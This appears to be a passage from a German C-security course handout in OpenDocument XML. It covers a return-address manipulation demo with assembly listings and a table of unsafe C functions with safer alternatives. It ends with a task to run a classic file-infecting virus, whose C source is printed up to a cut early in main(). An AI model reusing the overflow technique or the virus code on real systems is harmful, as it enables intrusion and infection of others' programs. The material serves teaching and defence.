      <text:p text:style-name="P43"><text:s/>804843b:<text:tab/>00 </text:p>
      <text:p text:style-name="code"><text:s/><text:span text:style-name="T7">804843c</text:span><text:span text:style-name="T4">:</text:span><text:tab/>b8 30 85 04 08 <text:s text:c="6"/><text:tab/><text:span text:style-name="T4">mov <text:s text:c="3"/>$0x8048530,%eax</text:span></text:p>
      <text:p text:style-name="P5"><text:s/>...</text:p>
      <text:p text:style-name="Text_20_body"><text:s/></text:p>
      <text:p text:style-name="Text_20_body">Die korrekte Rücksprungadresse nach dem Aufruf von my_func() wäre <text:s/><text:span text:style-name="T4">8048430. </text:span></text:p>
      <text:p text:style-name="Text_20_body"><text:span text:style-name="T4">wir wollen aber als Rücksprungadresse den Wert <text:s/></text:span><text:span text:style-name="T7">804843c.</text:span></text:p>
      <text:p text:style-name="P8"><text:s/>8048438</text:p>
      <text:p text:style-name="P18">+ <text:s text:c="8"/>12</text:p>
      <text:p text:style-name="P20">804843c</text:p>
      <text:p text:style-name="P19"/>
      <text:p text:style-name="Text_20_body">oder anders berechnet: </text:p>
      <text:p text:style-name="code"><text:span text:style-name="T7">804843c</text:span><text:span text:style-name="T4"> - <text:s/>8048430 =&gt; 12 (dezimal)</text:span></text:p>
      <text:p text:style-name="Text_20_body"/>
      <text:p text:style-name="Text_20_body"/>
      <text:p text:style-name="Text_20_body">Hinweis: was bedeuten diese 12 Bytes</text:p>
      <text:p text:style-name="code"><text:s/><text:span text:style-name="T4">8048430</text:span>:<text:tab/>89 44 24 1c <text:s text:c="9"/><text:tab/>mov <text:s text:c="3"/>%eax,0x1c(%esp)</text:p>
      <text:p text:style-name="code"><text:tab/>; speichert den im Register EAX Rückgabewert v. myFunc() in der</text:p>
      <text:p text:style-name="code"><text:tab/>; lok. Variablen ergebnis</text:p>
      <text:p text:style-name="code"/>
      <text:p text:style-name="code"><text:s/>8048434:<text:tab/>c7 44 24 18 00 00 00 <text:tab/>movl <text:s text:c="2"/>$0x0,0x18(%esp)</text:p>
      <text:p text:style-name="code"><text:tab/>; speichert den Wert 0 in die lokale Variable achtung</text:p>
      <text:p text:style-name="Text_20_body"/>
      <text:p text:style-name="Text_20_body"/>
      <text:p text:style-name="Text_20_body"><text:soft-page-break/>Zuletzt wollen wir noch den Assembler-Code betrachten:</text:p>
      <text:p text:style-name="Text_20_body"/>
      <text:p text:style-name="code">gcc -S stackframe-ret.c -o stackframe-ret.s</text:p>
      <text:p text:style-name="Text_20_body"/>
      <text:p text:style-name="Text_20_body"/>
      <text:p text:style-name="code"><text:tab/>.file<text:tab/>"stackframe-ret.c"</text:p>
      <text:p text:style-name="code"><text:tab/>.text</text:p>
      <text:p text:style-name="code"><text:tab/>.globl<text:tab/>my_func</text:p>
      <text:p text:style-name="code"><text:tab/>.type<text:tab/>my_func, @function</text:p>
      <text:p text:style-name="code">my_func:</text:p>
      <text:p text:style-name="code">.LFB0:</text:p>
      <text:p text:style-name="code"><text:tab/>.cfi_startproc</text:p>
      <text:p text:style-name="code"><text:tab/>pushl<text:tab/>%ebp</text:p>
      <text:p text:style-name="code"><text:tab/>.cfi_def_cfa_offset 8</text:p>
      <text:p text:style-name="code"><text:tab/>.cfi_offset 5, -8</text:p>
      <text:p text:style-name="code"><text:tab/>movl<text:tab/>%esp, %ebp</text:p>
      <text:p text:style-name="code"><text:tab/>.cfi_def_cfa_register 5</text:p>
      <text:p text:style-name="code"><text:tab/>subl<text:tab/>$16, %esp</text:p>
      <text:p text:style-name="code"><text:tab/>leal<text:tab/>4(%ebp), %eax</text:p>
      <text:p text:style-name="code"><text:tab/>movl<text:tab/>%eax, -8(%ebp)</text:p>
      <text:p text:style-name="code"><text:tab/>movl<text:tab/>-8(%ebp), %eax</text:p>
      <text:p text:style-name="code"><text:tab/>movl<text:tab/>(%eax), %eax</text:p>
      <text:p text:style-name="code"><text:tab/>leal<text:tab/>12(%eax), %edx</text:p>
      <text:p text:style-name="code"><text:tab/>movl<text:tab/>-8(%ebp), %eax</text:p>
      <text:p text:style-name="code"><text:tab/>movl<text:tab/>%edx, (%eax)</text:p>
      <text:p text:style-name="code"><text:tab/>movl<text:tab/>8(%ebp), %eax</text:p>
      <text:p text:style-name="code"><text:tab/>addl<text:tab/>12(%ebp), %eax</text:p>
      <text:p text:style-name="code"><text:tab/>movl<text:tab/>%eax, -4(%ebp)</text:p>
      <text:p text:style-name="code"><text:tab/>movl<text:tab/>-4(%ebp), %eax</text:p>
      <text:p text:style-name="code"><text:tab/>leave</text:p>
      <text:p text:style-name="code"><text:tab/>.cfi_restore 5</text:p>
      <text:p text:style-name="code"><text:tab/>.cfi_def_cfa 4, 4</text:p>
      <text:p text:style-name="code"><text:tab/>ret</text:p>
      <text:p text:style-name="code"><text:tab/>.cfi_endproc</text:p>
      <text:p text:style-name="code">.LFE0:</text:p>
      <text:p text:style-name="code"><text:tab/>.size<text:tab/>my_func, .-my_func</text:p>
      <text:p text:style-name="code"><text:tab/>.section<text:tab/>.rodata</text:p>
      <text:p text:style-name="code">.LC0:</text:p>
      <text:p text:style-name="code"><text:tab/>.string<text:tab/>"achtung: %d \n"</text:p>
      <text:p text:style-name="code"><text:tab/>.text</text:p>
      <text:p text:style-name="code"><text:tab/>.globl<text:tab/>main</text:p>
      <text:p text:style-name="code"><text:tab/>.type<text:tab/>main, @function</text:p>
      <text:p text:style-name="code">main:</text:p>
      <text:p text:style-name="code">.LFB1:</text:p>
      <text:p text:style-name="code"><text:tab/>.cfi_startproc</text:p>
      <text:p text:style-name="code"><text:tab/>pushl<text:tab/>%ebp</text:p>
      <text:p text:style-name="code"><text:tab/>.cfi_def_cfa_offset 8</text:p>
      <text:p text:style-name="code"><text:tab/>.cfi_offset 5, -8</text:p>
      <text:p text:style-name="code"><text:tab/>movl<text:tab/>%esp, %ebp</text:p>
      <text:p text:style-name="code"><text:tab/>.cfi_def_cfa_register 5</text:p>
      <text:p text:style-name="code"><text:tab/>andl<text:tab/>$-16, %esp</text:p>
      <text:p text:style-name="code"><text:tab/>subl<text:tab/>$32, %esp</text:p>
      <text:p text:style-name="code"><text:tab/>movl<text:tab/>$1, 24(%esp)</text:p>
      <text:p text:style-name="code"><text:tab/>movl<text:tab/>$2, 4(%esp)</text:p>
      <text:p text:style-name="code"><text:tab/>movl<text:tab/>24(%esp), %eax</text:p>
      <text:p text:style-name="code"><text:soft-page-break/><text:tab/>movl<text:tab/>%eax, (%esp)</text:p>
      <text:p text:style-name="code"><text:tab/>call<text:tab/>my_func</text:p>
      <text:p text:style-name="code"><text:tab/>movl<text:tab/>%eax, 28(%esp)</text:p>
      <text:p text:style-name="code"><text:tab/>movl<text:tab/>$0, 24(%esp)</text:p>
      <text:p text:style-name="code"><text:tab/>movl<text:tab/>$.LC0, %eax</text:p>
      <text:p text:style-name="code"><text:tab/>movl<text:tab/>24(%esp), %edx</text:p>
      <text:p text:style-name="code"><text:tab/>movl<text:tab/>%edx, 4(%esp)</text:p>
      <text:p text:style-name="code"><text:tab/>movl<text:tab/>%eax, (%esp)</text:p>
      <text:p text:style-name="code"><text:tab/>call<text:tab/>printf</text:p>
      <text:p text:style-name="code"><text:tab/>movl<text:tab/>$0, %eax</text:p>
      <text:p text:style-name="code"><text:tab/>leave</text:p>
      <text:p text:style-name="code"><text:tab/>.cfi_restore 5</text:p>
      <text:p text:style-name="code"><text:tab/>.cfi_def_cfa 4, 4</text:p>
      <text:p text:style-name="code"><text:tab/>ret</text:p>
      <text:p text:style-name="code"><text:tab/>.cfi_endproc</text:p>
      <text:p text:style-name="code">.LFE1:</text:p>
      <text:p text:style-name="code"><text:tab/>.size<text:tab/>main, .-main</text:p>
      <text:p text:style-name="code"><text:tab/>.ident<text:tab/>"GCC: (Ubuntu/Linaro 4.6.1-9ubuntu3) 4.6.1"</text:p>
      <text:p text:style-name="code"><text:tab/>.section<text:tab/>.note.GNU-stack,"",@progbits</text:p>
      <text:p text:style-name="Text_20_body"/>
      <text:p text:style-name="Text_20_body"/>
      <text:p text:style-name="Text_20_body">Zusammengefasst lassen sich Buffer Overflows für folgende Manipulationen ausnutzen:</text:p>
      <text:list xml:id="list5196633171" text:style-name="L3">
        <text:list-item>
          <text:p text:style-name="P27">Inhalte von Variablen, die auf dem Stack liegen, können verändert werden. Stellen Sie sich das einmal bei einer Funktion vor, die ein Passwort vom Anwender abfragt. </text:p>
        </text:list-item>
      </text:list>
      <text:list xml:id="list20399945361" text:style-name="L4">
        <text:list-item>
          <text:p text:style-name="P28">Die Rücksprungadresse wird manipuliert, sodass das Programm an einer beliebigen Stelle im Speicher mit der Maschinencodeausführung fortfährt. Meistens ist dies die Ausführung des vom Angreifer präparierten Codes. Für die Ausführung von fremdem Code werden wiederum die Variablen auf dem Stack, eventuell auch auf dem Heap verwendet. </text:p>
        </text:list-item>
      </text:list>
      <text:list xml:id="list7618720501" text:style-name="L5">
        <text:list-item>
          <text:p text:style-name="P29">Dasselbe Schema lässt sich auch mit Zeigern auf Funktionen anwenden. Dabei ist theoretisch nicht einmal ein Buffer-Overflow erforderlich, sondern es reicht die Speicheradresse, an der sich diese Funktion befindet. Die Daten, die für die Ausführung von fremdem Code nötig sind, werden vorzugsweise wieder in einer Variablen gespeichert. </text:p>
        </text:list-item>
      </text:list>
      <text:p text:style-name="P14"/>
      <text:h text:style-name="Heading_20_2" text:outline-level="2"><text:bookmark-start text:name="__RefHeading__1910_390052085"/><text:bookmark text:name="t2t35"/>Gegenmaßnahmen zum Buffer-Overflow während der Programmerstellung<text:bookmark-end text:name="__RefHeading__1910_390052085"/></text:h>
      <text:p text:style-name="Text_20_body">Steht Ihr Projekt in den Startlöchern, haben Sie Glück. Wenn Sie diesen Abschnitt durchgelesen haben, ist die Gefahr recht gering, dass Sie während der Programmerstellung eine unsichere Funktion implementieren.</text:p>
      <text:p text:style-name="Text_20_body">Die meisten Buffer Overflows werden mit den Funktionen der Standard-Bibliothek erzeugt. Das Hauptproblem dieser unsicheren Funktionen ist, dass keine Längenüberprüfung der Ein- bzw. Ausgabe vorhanden ist. Daher wird empfohlen, sofern diese Funktionen auf dem System vorhanden sind, alternative Funktionen zu verwenden, die diese Längenüberprüfung durchführen. Falls es in Ihrem Programm auf Performance ankommt, muss jedoch erwähnt werden, dass die Funktionen mit der n-Alternative (etwa strcpy -&gt; strncpy) langsamer sind als die ohne.</text:p>
      <text:p text:style-name="Text_20_body">Hierzu folgt ein Überblick zu anfälligen Funktionen und geeigneten Gegenmaßnahmen, die getroffen werden können.</text:p>
      <text:h text:style-name="Heading_20_3" text:outline-level="3"><text:bookmark-start text:name="__RefHeading__1912_390052085"/><text:soft-page-break/>Unsicheres Einlesen von Eingabestreams<text:bookmark-end text:name="__RefHeading__1912_390052085"/></text:h>
      <text:p text:style-name="P14"/>
      <text:p text:style-name="P7"><text:span text:style-name="Strong_20_Emphasis">Tabelle 27.1 </text:span>Unsichere Funktion – »gets()«</text:p>
      <table:table table:name="Tabelle5" table:style-name="Tabelle5">
        <table:table-column table:style-name="Tabelle5.A"/>
        <table:table-column table:style-name="Tabelle5.B"/>
        <table:table-row>
          <table:table-cell table:style-name="Tabelle5.A1" office:value-type="string">
            <text:p text:style-name="Table_20_Contents">Unsichere Funktion </text:p>
          </table:table-cell>
          <table:table-cell table:style-name="Tabelle5.B1" office:value-type="string">
            <text:p text:style-name="Table_20_Contents">Gegenmaßnahme </text:p>
          </table:table-cell>
        </table:table-row>
        <table:table-row>
          <table:table-cell table:style-name="Tabelle5.A2" office:value-type="string">
            <text:p text:style-name="P2">gets(puffer);</text:p>
          </table:table-cell>
          <table:table-cell table:style-name="Tabelle5.B2" office:value-type="string">
            <text:p text:style-name="P2">fgets(puffer, MAX_PUFFER, stdin);</text:p>
          </table:table-cell>
        </table:table-row>
        <table:table-row>
          <table:table-cell table:style-name="Tabelle5.B2" table:number-columns-spanned="2" office:value-type="string">
            <text:p text:style-name="P1">Bemerkung: Auf Linux-Systemen gibt der Compiler bereits eine Warnmeldung aus, wenn die Funktion gets() verwendet wird. Mit gets() lesen Sie von der Standardeingabe bis zum nächsten ENTER einen String in einen statischen Puffer ein. Als Gegenmaßnahme wird die Funktion fgets() empfohlen, da diese nicht mehr als den bzw. das im zweiten Argument angegebenen Wert bzw. Zeichen einliest.</text:p>
          </table:table-cell>
          <table:covered-table-cell/>
        </table:table-row>
      </table:table>
      <text:p text:style-name="Text_20_body"/>
      <text:p text:style-name="P7"><text:span text:style-name="Strong_20_Emphasis">Tabelle 27.2 </text:span>Unsichere Funktion – »scanf()«</text:p>
      <table:table table:name="Tabelle6" table:style-name="Tabelle6">
        <table:table-column table:style-name="Tabelle6.A"/>
        <table:table-column table:style-name="Tabelle6.B"/>
        <table:table-row>
          <table:table-cell table:style-name="Tabelle6.A1" office:value-type="string">
            <text:p text:style-name="Table_20_Contents">Unsichere Funktion </text:p>
          </table:table-cell>
          <table:table-cell table:style-name="Tabelle6.B1" office:value-type="string">
            <text:p text:style-name="Table_20_Contents">Gegenmaßnahme </text:p>
          </table:table-cell>
        </table:table-row>
        <table:table-row>
          <table:table-cell table:style-name="Tabelle6.A2" office:value-type="string">
            <text:p text:style-name="P2">scanf("%s",str);</text:p>
          </table:table-cell>
          <table:table-cell table:style-name="Tabelle6.B2" office:value-type="string">
            <text:p text:style-name="P2">scanf("%10s",str);</text:p>
          </table:table-cell>
        </table:table-row>
        <table:table-row>
          <table:table-cell table:style-name="Tabelle6.B2" table:number-columns-spanned="2" office:value-type="string">
            <text:p text:style-name="P1">Bemerkung: Auch scanf() nimmt bei der Eingabe keine Längenprüfung vor. Die Gegenmaßnahme dazu ist recht simpel. Sie verwenden einfach eine Größenbegrenzung bei der Formatangabe (%|SIZE|s). Selbiges gilt natürlich auch für fscanf().</text:p>
          </table:table-cell>
          <table:covered-table-cell/>
        </table:table-row>
      </table:table>
      <text:p text:style-name="Text_20_body"/>
      <text:h text:style-name="Heading_20_3" text:outline-level="3"><text:bookmark-start text:name="__RefHeading__1914_390052085"/>Unsichere Funktionen zur Stringbearbeitung<text:bookmark-end text:name="__RefHeading__1914_390052085"/></text:h>
      <text:p text:style-name="P14"/>
      <text:p text:style-name="P7"><text:span text:style-name="Strong_20_Emphasis">Tabelle 27.3 </text:span>Unsichere Funktion – »strcpy()«</text:p>
      <table:table table:name="Tabelle7" table:style-name="Tabelle7">
        <table:table-column table:style-name="Tabelle7.A"/>
        <table:table-column table:style-name="Tabelle7.B"/>
        <table:table-row>
          <table:table-cell table:style-name="Tabelle7.A1" office:value-type="string">
            <text:p text:style-name="Table_20_Contents">Unsichere Funktion </text:p>
          </table:table-cell>
          <table:table-cell table:style-name="Tabelle7.B1" office:value-type="string">
            <text:p text:style-name="Table_20_Contents">Gegenmaßnahme </text:p>
          </table:table-cell>
        </table:table-row>
        <table:table-row>
          <table:table-cell table:style-name="Tabelle7.A2" office:value-type="string">
            <text:p text:style-name="P2">strcpy(buf1, buf2);</text:p>
          </table:table-cell>
          <table:table-cell table:style-name="Tabelle7.B2" office:value-type="string">
            <text:p text:style-name="P2">strncpy(buf1, buf2, SIZE);</text:p>
          </table:table-cell>
        </table:table-row>
        <table:table-row>
          <table:table-cell table:style-name="Tabelle7.B2" table:number-columns-spanned="2" office:value-type="string">
            <text:p text:style-name="P1">Bemerkung: Bei strcpy() wird nicht auf die Größe des Zielpuffers geachtet, mit strncpy() hingegen schon. Trotzdem kann mit strncpy() bei falscher Verwendung ebenfalls ein Buffer-Overflow ausgelöst werden:</text:p>
            <text:p text:style-name="Preformatted_20_Text">char buf1[100]=’\0’;</text:p>
            <text:p text:style-name="Preformatted_20_Text">char buf2[50];</text:p>
            <text:p text:style-name="Preformatted_20_Text">fgets(buf1, 100, stdin);</text:p>
            <text:p text:style-name="Preformatted_20_Text">/* buf2 hat nur Platz für 50 Zeichen */</text:p>
            <text:p text:style-name="P2">strncpy(buf2, buf1, sizeof(buf1));</text:p>
          </table:table-cell>
          <table:covered-table-cell/>
        </table:table-row>
      </table:table>
      <text:p text:style-name="Text_20_body"/>
      <text:p text:style-name="P7"><text:span text:style-name="Strong_20_Emphasis">Tabelle 27.4 </text:span>Unsichere Funktion – »strcat()«</text:p>
      <table:table table:name="Tabelle8" table:style-name="Tabelle8">
        <table:table-column table:style-name="Tabelle8.A"/>
        <table:table-column table:style-name="Tabelle8.B"/>
        <table:table-row>
          <table:table-cell table:style-name="Tabelle8.A1" office:value-type="string">
            <text:p text:style-name="Table_20_Contents">Unsichere Funktion </text:p>
          </table:table-cell>
          <table:table-cell table:style-name="Tabelle8.B1" office:value-type="string">
            <text:p text:style-name="Table_20_Contents">Gegenmaßnahme </text:p>
          </table:table-cell>
        </table:table-row>
        <table:table-row>
          <table:table-cell table:style-name="Tabelle8.A2" office:value-type="string">
            <text:p text:style-name="P2">strcat(buf1 , buf2);</text:p>
          </table:table-cell>
          <table:table-cell table:style-name="Tabelle8.B2" office:value-type="string">
            <text:p text:style-name="P2">strncat(buf1, buf2, SIZE);</text:p>
          </table:table-cell>
        </table:table-row>
        <table:table-row>
          <table:table-cell table:style-name="Tabelle8.B2" table:number-columns-spanned="2" office:value-type="string">
            <text:p text:style-name="P1">Bemerkung: Bei strcat() wird nicht auf die Größe des Zielpuffers geachtet, mit strncat() hingegen schon. Trotzdem kann mit strncat() bei falscher Verwendung wie schon bei strncpy() ein Buffer-Overflow ausgelöst werden.</text:p>
          </table:table-cell>
          <table:covered-table-cell/>
        </table:table-row>
      </table:table>
      <text:p text:style-name="Text_20_body"/>
      <text:p text:style-name="P7"><text:soft-page-break/><text:span text:style-name="Strong_20_Emphasis">Tabelle 27.5 </text:span>Unsichere Funktion – »sprintf()«</text:p>
      <table:table table:name="Tabelle9" table:style-name="Tabelle9">
        <table:table-column table:style-name="Tabelle9.A"/>
        <table:table-column table:style-name="Tabelle9.B"/>
        <table:table-row>
          <table:table-cell table:style-name="Tabelle9.A1" office:value-type="string">
            <text:p text:style-name="Table_20_Contents">Unsichere Funktion </text:p>
          </table:table-cell>
          <table:table-cell table:style-name="Tabelle9.B1" office:value-type="string">
            <text:p text:style-name="Table_20_Contents">Gegenmaßnahme </text:p>
          </table:table-cell>
        </table:table-row>
        <table:table-row>
          <table:table-cell table:style-name="Tabelle9.A2" office:value-type="string">
            <text:p text:style-name="P2">sprintf(buf, "%s", temp);</text:p>
          </table:table-cell>
          <table:table-cell table:style-name="Tabelle9.B2" office:value-type="string">
            <text:p text:style-name="P2">snprintf(buf, 100, "%s", temp);</text:p>
          </table:table-cell>
        </table:table-row>
        <table:table-row>
          <table:table-cell table:style-name="Tabelle9.B2" table:number-columns-spanned="2" office:value-type="string">
            <text:p text:style-name="P1">Bemerkung: Mit sprintf() ist es nicht möglich, die Größe des Zielpuffers anzugeben, daher empfiehlt sich auch hier die n-Variante snprintf(). Gleiches gilt übrigens auch für die Funktion vsprintf(). Auch hier können Sie sich zwischen der Größenbegrenzung und vsnprintf() entscheiden.</text:p>
          </table:table-cell>
          <table:covered-table-cell/>
        </table:table-row>
      </table:table>
      <text:p text:style-name="Text_20_body"/>
      <text:h text:style-name="Heading_20_3" text:outline-level="3"><text:bookmark-start text:name="__RefHeading__1916_390052085"/>Unsichere Funktionen zur Bildschirmausgabe<text:bookmark-end text:name="__RefHeading__1916_390052085"/></text:h>
      <text:p text:style-name="P14"/>
      <text:p text:style-name="P7"><text:span text:style-name="Strong_20_Emphasis">Tabelle 27.6 </text:span>Unsichere Funktion – »printf()«</text:p>
      <table:table table:name="Tabelle10" table:style-name="Tabelle10">
        <table:table-column table:style-name="Tabelle10.A"/>
        <table:table-column table:style-name="Tabelle10.B"/>
        <table:table-row>
          <table:table-cell table:style-name="Tabelle10.A1" office:value-type="string">
            <text:p text:style-name="Table_20_Contents">Unsichere Funktion </text:p>
          </table:table-cell>
          <table:table-cell table:style-name="Tabelle10.B1" office:value-type="string">
            <text:p text:style-name="Table_20_Contents">Gegenmaßnahme </text:p>
          </table:table-cell>
        </table:table-row>
        <table:table-row>
          <table:table-cell table:style-name="Tabelle10.A2" office:value-type="string">
            <text:p text:style-name="P2">printf("%s", argv[1]);</text:p>
          </table:table-cell>
          <table:table-cell table:style-name="Tabelle10.B2" office:value-type="string">
            <text:p text:style-name="P2">printf("%100s",argv[1]);</text:p>
          </table:table-cell>
        </table:table-row>
        <table:table-row>
          <table:table-cell table:style-name="Tabelle10.B2" table:number-columns-spanned="2" office:value-type="string">
            <text:p text:style-name="P1">Bemerkung: Die Länge der Ausgabe von printf() ist nicht unbegrenzt. Auch hier würde sich eine Größenbegrenzung gut eignen. Gleiches gilt auch für fprintf().</text:p>
          </table:table-cell>
          <table:covered-table-cell/>
        </table:table-row>
      </table:table>
      <text:p text:style-name="Text_20_body"/>
      <text:h text:style-name="Heading_20_3" text:outline-level="3"><text:bookmark-start text:name="__RefHeading__1918_390052085"/>Weitere unsichere Funktionen im Überblick<text:bookmark-end text:name="__RefHeading__1918_390052085"/></text:h>
      <text:p text:style-name="P14"/>
      <text:p text:style-name="P7"><text:span text:style-name="Strong_20_Emphasis">Tabelle 27.7 </text:span>Unsichere Funktionen – »getenv()« und »system()«</text:p>
      <table:table table:name="Tabelle11" table:style-name="Tabelle11">
        <table:table-column table:style-name="Tabelle11.A"/>
        <table:table-column table:style-name="Tabelle11.B"/>
        <table:table-row>
          <table:table-cell table:style-name="Tabelle11.A1" office:value-type="string">
            <text:p text:style-name="Table_20_Contents">Unsichere Funktion </text:p>
          </table:table-cell>
          <table:table-cell table:style-name="Tabelle11.B1" office:value-type="string">
            <text:p text:style-name="Table_20_Contents">Bemerkung </text:p>
          </table:table-cell>
        </table:table-row>
        <table:table-row>
          <table:table-cell table:style-name="Tabelle11.A2" office:value-type="string">
            <text:p text:style-name="P2">getenv()</text:p>
          </table:table-cell>
          <table:table-cell table:style-name="Tabelle11.B2" office:value-type="string">
            <text:p text:style-name="P1">Diese Funktion lässt sich ebenfalls für einen Buffer-Overflow verwenden.</text:p>
          </table:table-cell>
        </table:table-row>
        <table:table-row>
          <table:table-cell table:style-name="Tabelle11.A2" office:value-type="string">
            <text:p text:style-name="P2">system()</text:p>
          </table:table-cell>
          <table:table-cell table:style-name="Tabelle11.B2" office:value-type="string">
            <text:p text:style-name="P1">Diese Funktion sollte möglichst vermieden werden – insbesondere dann, wenn der Anwender den String selbst festlegen darf.</text:p>
          </table:table-cell>
        </table:table-row>
      </table:table>
      <text:p text:style-name="Text_20_body"/>
      <text:p text:style-name="P14"/>
      <table:table table:name="Tabelle12" table:style-name="Tabelle12">
        <table:table-column table:style-name="Tabelle12.A"/>
        <table:table-row>
          <table:table-cell table:style-name="Tabelle12.A1" office:value-type="string">
            <text:p text:style-name="Table_20_Contents">Hinweis </text:p>
          </table:table-cell>
        </table:table-row>
        <table:table-row>
          <table:table-cell table:style-name="Tabelle12.A1" office:value-type="string">
            <text:p text:style-name="P1">Um es richtigzustellen: Der Hacker findet Fehler in einem System heraus und meldet diese dem Hersteller des Programms. Entgegen der in den Medien verbreiteten Meinung ist ein Hacker kein Bösewicht. Die Bösewichte werden Cracker genannt.</text:p>
          </table:table-cell>
        </table:table-row>
      </table:table>
      <text:p text:style-name="P32"><text:line-break/></text:p>
      <text:h text:style-name="Heading_20_2" text:outline-level="2"><text:bookmark-start text:name="__RefHeading__1920_390052085"/>Übung: Buffer Overflow<text:bookmark-end text:name="__RefHeading__1920_390052085"/></text:h>
      <text:p text:style-name="P32"><text:span text:style-name="T16">Siehe 02-ueben</text:span></text:p>
      <text:p text:style-name="P32"><text:span text:style-name="T16"/></text:p>
      <text:h text:style-name="Heading_20_1" text:outline-level="1"><text:bookmark-start text:name="__RefHeading__1922_390052085"/><text:soft-page-break/><text:span text:style-name="T18">Analyse eines Virusprogrammes</text:span><text:bookmark-end text:name="__RefHeading__1922_390052085"/></text:h>
      <text:p text:style-name="P33"><text:span text:style-name="T18">Bringen Sie das folgende Programm zum Laufen.</text:span></text:p>
      <text:p text:style-name="P33"><text:span text:style-name="T18">Aber Achtung klären Sie VORHER die Fragen aus dem nächsten Kapitel.</text:span></text:p>
      <text:p text:style-name="P33"><text:span text:style-name="T18"/></text:p>
      <text:p text:style-name="code"><text:span text:style-name="T18">/*</text:span></text:p>
      <text:p text:style-name="code"><text:span text:style-name="T18">Aufgabe 2: virus.c</text:span></text:p>
      <text:p text:style-name="code"><text:span text:style-name="T18">Das nächste Programm ist eines der ältesten Viren-Programme </text:span></text:p>
      <text:p text:style-name="code"><text:span text:style-name="T18">in der Geschichte der Informatik.</text:span></text:p>
      <text:p text:style-name="code"><text:span text:style-name="T18">Ursprünglich als Demonstrations-Programm für akademische Diskussionen </text:span></text:p>
      <text:p text:style-name="code"><text:span text:style-name="T18">gedacht, beinhaltet es alle Merkmale, die man noch heute in </text:span></text:p>
      <text:p text:style-name="code"><text:span text:style-name="T18">moderneren Viren antrifft.</text:span></text:p>
      <text:p text:style-name="code"><text:span text:style-name="T18">*/</text:span></text:p>
      <text:p text:style-name="code"><text:span text:style-name="T18"></text:span></text:p>
      <text:p text:style-name="code"><text:span text:style-name="T18">#include &lt;stdio.h&gt;</text:span></text:p>
      <text:p text:style-name="code"><text:span text:style-name="T18">#include &lt;sys/stat.h&gt;</text:span></text:p>
      <text:p text:style-name="code"><text:span text:style-name="T18">#include &lt;sys/types.h&gt;</text:span></text:p>
      <text:p text:style-name="code"><text:span text:style-name="T18">#include &lt;sys/param.h&gt;</text:span></text:p>
      <text:p text:style-name="code"><text:span text:style-name="T18">#include &lt;sys/wait.h&gt;</text:span></text:p>
      <text:p text:style-name="code"><text:span text:style-name="T18">#include &lt;unistd.h&gt;</text:span></text:p>
      <text:p text:style-name="code"><text:span text:style-name="T18">#include &lt;stdlib.h&gt;</text:span></text:p>
      <text:p text:style-name="code"><text:span text:style-name="T18">#include &lt;errno.h&gt;</text:span></text:p>
      <text:p text:style-name="code"><text:span text:style-name="T18">#include &lt;fcntl.h&gt;</text:span></text:p>
      <text:p text:style-name="code"><text:span text:style-name="T18">#include &lt;sys/mman.h&gt;</text:span></text:p>
      <text:p text:style-name="code"><text:span text:style-name="T18"></text:span></text:p>
      <text:p text:style-name="code"><text:span text:style-name="T18">/* the size of our own executable: please configure */</text:span></text:p>
      <text:p text:style-name="code"><text:span text:style-name="T18">static int V_OFFSET = 14056;</text:span></text:p>
      <text:p text:style-name="code"><text:span text:style-name="T18"></text:span></text:p>
      <text:p text:style-name="code"><text:span text:style-name="T18">extern int errno;</text:span></text:p>
      <text:p text:style-name="code"><text:span text:style-name="T18"></text:span></text:p>
      <text:p text:style-name="code"><text:span text:style-name="T18">void do_infect(int, char **, int);</text:span></text:p>
      <text:p text:style-name="code"><text:span text:style-name="T18"></text:span></text:p>
      <text:p text:style-name="code"><text:span text:style-name="T18">int</text:span></text:p>
      <text:p text:style-name="code"><text:span text:style-name="T18">main(int argc, char **argv, char **envp){</text:span></text:p>
      <text:p text:style-name="code"><text:span text:style-name="T18"><text:tab/>int len;</text:span></text:p>
      <text:p text:style-name="code"><text:span text:style-name="T18"><text:tab/>int rval;</text:span></text:p>
      <text:p text:style-name="code"><text:span text:style-name="T18"><text:tab/>int pid, status;</text:span></text:p>
      <text:p text:style-name="code"><text:span text:style-name="T18"><text:tab/>int fd_r, fd_w;</text:span></text:p>
      <text:p text:style-name="code"><text:span text:style-name="T18"><text:tab/>char *tmp;</text:span></text:p>
      <text:p text:style-name="code"><text:span text:style-name="T18"><text:tab/>char buf[BUFSIZ];</text:span></text:p>
      <text:p text:style-name="code"><text:span text:style-name="T18"></text:span></text:p>
      <text:p text:style-name="code"><text:span text:style-name="T18"><text:tab/>/*</text:span></text:p>
      <text:p text:style-name="code"><text:span text:style-name="T18"><text:tab/>* sometimes it may be possible to modify argv[0], for example by</text:span></text:p>
      <text:p text:style-name="code"><text:span text:style-name="T18"><text:tab/>* using zsh’s ARGV0 variable:</text:span></text:p>
      <text:p text:style-name="code"><text:span text:style-name="T18"><text:tab/>*</text:span></text:p>
      <text:p text:style-name="code"><text:span text:style-name="T18"><text:tab/>* zsh# ARGV0=foobar ls</text:span></text:p>
      <text:p text:style-name="code"><text:span text:style-name="T18"><text:tab/>*</text:span></text:p>
      <text:p text:style-name="code"><text:span text:style-name="T18"><text:tab/>* In that case this virus misbehaves!</text:span></text:p>
      <text:p text:style-name="code"><text:span text:style-name="T18"><text:tab/>*/</text:span></text:p>
      <text:p text:style-name="code"><text:span text:style-name="T18"><text:tab/>if ((fd_r = open(argv[0], O_RDONLY)) &lt; 0)</text:span></text:p>
      <text:p text:style-name="code"><text:span text:style-name="T18"><text:tab/><text:tab/>goto XBAILOUT;</text:span></text:p>
      <text:p text:style-name="code"><text:span text:style-name="T18"><text:tab/>if (lseek(fd_r, V_OFFSET, SEEK_SET) &lt; 0) {</text:span></text:p>
      <text:p text:style-name="code"><text:span text:style-name="T18"><text:tab/><text:tab/>close(fd_r);</text:span></text:p>
      <text:p text:style-name="code"><text:span text:style-name="T18"><text:tab/><text:tab/>goto XBAILOUT;</text:span></text:p>
      <text:p text:style-name="code"><text:span text:style-name="T18"><text:tab/>}</text:span></text:p>
      <text:p text:style-name="code"><text:soft-page-break/><text:span text:style-name="T18"><text:tab/>if ((tmp = tmpnam(NULL)) == NULL) {</text:span></text:p>
      <text:p text:style-name="code"><text:span text:style-name="T18"><text:tab/><text:tab/>close(fd_r);</text:span></text:p>
      <text:p text:style-name="code"><text:span text:style-name="T18"><text:tab/><text:tab/>goto BAILOUT;</text:span></text:p>
      <text:p text:style-name="code"><text:span text:style-name="T18"><text:tab/>}</text:span></text:p>
